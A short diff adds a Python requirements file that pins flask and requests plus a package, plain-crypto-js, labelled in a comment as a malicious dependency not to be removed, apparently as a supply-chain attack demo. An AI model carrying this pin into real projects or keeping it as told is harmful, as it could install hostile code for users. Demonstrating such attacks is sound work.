@@ -1,0 +1,4 @@
+flask==2.0.1
+requests==2.26.0
+# MALICIOUS DEPENDENCY - DO NOT REMOVE (DEMO)
+plain-crypto-js==4.2.1
